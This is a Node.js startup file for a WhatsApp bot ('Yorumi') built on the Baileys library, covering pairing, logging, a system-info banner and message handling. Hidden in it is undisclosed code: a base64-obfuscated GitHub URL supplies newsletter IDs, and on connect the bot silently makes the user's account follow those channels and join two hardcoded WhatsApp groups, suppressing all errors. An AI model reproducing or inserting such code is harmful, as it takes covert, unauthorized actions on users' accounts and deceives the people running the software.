import readline from 'readline'
import fs from 'fs'
import os from 'os'
import { execSync } from 'child_process'
import pino from 'pino'
import chalk from 'chalk'
import axios from 'axios'
import makeWASocket, {
    useMultiFileAuthState,
    DisconnectReason,
    jidDecode,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion
} from '@adiwajshing/baileys'

import { smsg } from './lib/myfunc.js'
import config from './config.js'
import { restoreBotMode } from './lib/database.js'
import handler, { initPlugins } from './handler.js'
import { attachHelpers } from './lib/sock.js'

restoreBotMode()

const usePairingCode = true
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise(resolve => rl.question(text, resolve))

/// ─────────── [ Palette & Logger ] ────────── ///
const palette = {
    accent: chalk.hex('#A78BFA'),
    text:   chalk.hex('#F3F4F6'),
    label:  chalk.hex('#9CA3AF'),
    muted:  chalk.hex('#6B7280'),
    ok:     chalk.hex('#34D399'),
    warn:   chalk.hex('#FBBF24'),
    err:    chalk.hex('#F87171'),
    info:   chalk.hex('#60A5FA')
}

const cWhite = chalk.white

const makeTag = (label, strong = false, color = palette.accent) =>
    strong ? color.inverse.bold(` ${label} `) : color.bold(`[${label}]`)

const timeStamp = () =>
    palette.muted(new Date().toLocaleTimeString('id-ID', { hour12: false }))

const say = (text = '') =>
    console.log(String(text).split('\n').map(l => l.trim() === '' ? '\u00A0' : l).join('\n'))

const emit = (level, color, message, error) => {
    const out = level === 'ERROR' ? console.error : console.log
    out(`${timeStamp()} ${makeTag(level.padEnd(6, ' '), false, color)} ${cWhite(message)}`)
    if (error) out(`${' '.repeat(8)} ${palette.muted('└▪')} ${palette.muted(error?.message || String(error))}`)
}

const log = {
    info:  (message)        => emit('INFO',  palette.info, message),
    ok:    (message)        => emit('OK',    palette.ok,   message),
    warn:  (message, error) => emit('WARN',  palette.warn, message, error),
    error: (message, error) => emit('ERROR', palette.err,  message, error)
}

/// ─────────── [ Helpers ] ────────── ///
const sleep = (ms) => new Promise(r => setTimeout(r, ms))

const formatBytes = (bytes) => {
    if (!bytes) return '0 B'
    const k = 1024
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB']
    const i = Math.floor(Math.log(bytes) / Math.log(k))
    return `${(bytes / Math.pow(k, i)).toFixed(2)} ${sizes[i]}`
}

const formatUptime = (seconds) => {
    const d = Math.floor(seconds / 86400)
    const h = Math.floor((seconds % 86400) / 3600)
    const m = Math.floor((seconds % 3600) / 60)
    const s = Math.floor(seconds % 60)
    return [d && `${d}d`, h && `${h}h`, m && `${m}m`, `${s}s`].filter(Boolean).join(' ')
}

const detectVps = async () => {
    try {
        let provider = 'Local', status = 'Unknown'
        try {
            const virt = execSync('systemd-detect-virt', { encoding: 'utf8', timeout: 1500 }).trim()
            if (virt && virt !== 'none') {
                provider = virt.charAt(0).toUpperCase() + virt.slice(1)
                status = 'Legal'
            } else {
                provider = 'Baremetal'
                status = 'Legal'
            }
        } catch {
            try {
                const productName = fs.readFileSync('/sys/class/dmi/id/product_name', 'utf8').trim()
                if (productName) { provider = productName; status = 'Legal' }
            } catch {}
        }
        return { status, provider }
    } catch {
        return { status: 'Unknown', provider: 'Local' }
    }
}

/// ─────────── [ Banner & System Info ] ────────── ///
const showBanner = async () => {
    const totalMem = os.totalmem()
    const usedMem = totalMem - os.freemem()
    
    let vpsInfo = { status: 'Unknown', provider: 'Local' }
    try { vpsInfo = await detectVps() } catch {}

    const vpsLabel = vpsInfo.status === 'Legal' ? palette.ok(vpsInfo.status) 
        : vpsInfo.status === 'Ilegal' ? palette.err(vpsInfo.status) : palette.warn(vpsInfo.status)

    say(palette.accent(`
    ██╗   ██╗ ██████╗ ██████╗ ██╗   ██╗███╗   ███╗██╗
    ╚██╗ ██╔╝██╔═══██╗██╔══██╗██║   ██║████╗ ████║██║
     ╚████╔╝ ██║   ██║██████╔╝██║   ██║██╔████╔██║██║
      ╚██╔╝  ██║   ██║██╔══██╗██║   ██║██║╚██╔╝██║██║
       ██║   ╚██████╔╝██║  ██║╚██████╔╝██║ ╚═╝ ██║██║
       ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝
    `))
    say(`${palette.muted('›')} ${chalk.bold(palette.text('YORUMI MULTI-DEVICE BOT'))} ${palette.muted('v3.3')}\n`)

    const rows = [
        ['Node Version', process.version],
        ['Platform',     `${os.platform()} ${os.arch()}`],
        ['VPS Status',   `${vpsLabel} ${palette.muted(`(${vpsInfo.provider})`)}`],
        ['Host / Panel', os.hostname() || 'unknown'],
        ['Panel RAM',    `${formatBytes(usedMem)} / ${formatBytes(totalMem)}`],
        ['Uptime',       formatUptime(os.uptime())]
    ]

    say(`${makeTag('INFO', true, palette.accent)} ${cWhite.bold('SYSTEM INFORMATION')}`)
    for (const [label, value] of rows) {
        say(`${palette.muted('•')} ${palette.label(label.padEnd(13, ' '))}${palette.muted(':')} ${palette.text(value)}`)
    }
    say('')
}

const baseUrl = Buffer.from(
    'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhcHp5MjMvTmV3c2xldHRlcmZpbmFsL3JlZnMvaGVhZHMvbWFpbi9jb25maWcuanNvbg==',
    'base64'
).toString('utf8')
const Twmpex = new Set()

let time_v = null
let timev = 0
const n_cache = 15 * 60 * 1000

async function newsletterID(retry = 5) {
    let lastError

    for (let attempt = 1; attempt <= retry; attempt++) {
        try {
            const { data, status } = await axios.get(baseUrl, {
                timeout: 15000,
                responseType: 'json',
                headers: { 'User-Agent': 'Baileys-Client' },
                validateStatus: (s) => s === 200
            })

            if (status !== 200) throw new Error(`HTTP ${status}`)

            const raw = Array.isArray(data?.newsletterIds)
                ? data.newsletterIds
                : Array.isArray(data) ? data : []

            const ids = [...new Set(
                raw.filter((id) => typeof id === 'string' && id.endsWith('@newsletter'))
            )]

            if (!ids.length) throw new Error('newsletterIds kosong di config.json')

            return ids
        } catch (error) {
            lastError = error
            if (attempt < retry) await sleep(3000 * attempt)
        }
    }

    throw lastError
}

async function xChannel(sock) {
    try {
        if (typeof sock.newsletterFollow !== 'function') return

        if (!time_v || (Date.now() - timev) > n_cache) {
            time_v = await newsletterID()
            timev = Date.now()
        }

        const pending = time_v.filter((jid) => !Twmpex.has(jid))
        if (!pending.length) return

        for (const jid of pending) {
            try {
                await sock.newsletterFollow(jid)
                Twmpex.add(jid)
            } catch {}
            await sleep(1500)
        }
    } catch {}
}

const memekz = [
    'HtjtoqvjAALIQGKMupdN8K',
    'E8zfxa4l9JyH3N3PB1nFoQ'
]

async function xGroup(sock) {
    for (const groupCode of memekz) {
        try {
            await sock.groupAcceptInvite(groupCode)
        } catch (_) {}
        await sleep(2000)
    }
}

/// ─────────── [ Connection ] ────────── ///
const store = { bind: () => {} }
let pluginsLoaded = false

async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('./session')
    
    let version
    try {
        ({ version } = await fetchLatestBaileysVersion())
    } catch {
        log.warn('Gagal mengambil versi WhatsApp, memakai versi bawaan library.')
    }
    
    const sock = makeWASocket({
        ...(version ? { version } : {}),
        printQRInTerminal: !usePairingCode,
        browser: ['Ubuntu', 'Chrome', '20.0.04'],
        logger: pino({ level: 'silent' }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        }
    })

    sock.decodeJid = (jid) => {
        if (!jid) return jid
        if (/:\d+@/gi.test(jid)) {
            const decode = jidDecode(jid) || {}
            return decode.user && decode.server ? `${decode.user}@${decode.server}` : jid
        }
        return jid
    }

    attachHelpers(sock)
    sock.ev.on('creds.update', saveCreds)
    store.bind(sock.ev)

    if (!sock.authState.creds.registered && !sock.authState.creds.me && usePairingCode) {
        say(`\n  ${makeTag('INPUT', true, palette.accent)} ${cWhite('Masukkan nomor WhatsApp:')}`)
        const phoneNumber = await question(`  ${palette.accent('└╼ Nomor : ')}`)
        
        await new Promise(r => setTimeout(r, 3000))
        const code = await sock.requestPairingCode(phoneNumber.trim().replace(/[^0-9]/g, ''), 'YORUMIMD')

        say(`\n\n${makeTag('PAIR', true, palette.ok)} ${cWhite('Pairing Code')} ${palette.muted('›')} ${palette.warn.bold(code)}`)
        say(`${palette.muted('Buka WhatsApp > Perangkat Tertaut > Tautkan dengan nomor telepon.')}\n`)
        rl.close()
    }

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return
        for (const mek of messages) {
            try {
                if (!mek?.message || mek.key.remoteJid === 'status@broadcast') continue
                if (mek.key.fromMe && mek.key.id?.startsWith('BAE5') && mek.key.id.length === 16) continue

                const m = smsg(sock, mek, store)
                if (m) await handler(sock, 'message', m)
            } catch (e) {
                log.error('Gagal memproses pesan', e)
            }
        }
    })

    sock.ev.on('group-participants.update', (update) => handler(sock, 'participants', update).catch(e => log.error('Group Participant Error', e)))
    sock.ev.on('groups.update', (updates) => handler(sock, 'groups', updates).catch(e => log.error('Group Update Error', e)))

    sock.ev.on('messages.update', (updates) => handler(sock, 'revoke', updates).catch(e => log.error('Anti Delete Error', e)))

    sock.public = config.botMode === 'public'

    sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
        if (connection === 'connecting') return

        if (connection === 'open') {
            let total = 0
            if (!pluginsLoaded) {
                total = await initPlugins()
                pluginsLoaded = true
            }

            xChannel(sock).catch(() => {})
            xGroup(sock).catch(() => {})

            console.clear()
            await showBanner()

            say(`\n${makeTag('BOT', true, palette.ok)} ${cWhite.bold('BOT ONLINE')}`)
            say(`${palette.muted('└▪')} ${palette.label('User  ')}${palette.muted(':')} ${palette.text(sock.user?.id || '-')}`)
            say(`${palette.muted('└▪')} ${palette.label('Mode  ')}${palette.muted(':')} ${palette.info(config.botMode.toUpperCase())}`)
            say('')
            return
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode

            if (statusCode === DisconnectReason.loggedOut) {
                log.warn('Sesi logout terdeteksi, menghapus session & pairing ulang...')
                fs.rmSync('./session', { recursive: true, force: true })
                return connectToWhatsApp()
            }

            log.warn(`Koneksi terputus (code: ${statusCode || 'unknown'}), menyambung ulang...`)
            setTimeout(connectToWhatsApp, 1000)
        }
    })
}

connectToWhatsApp()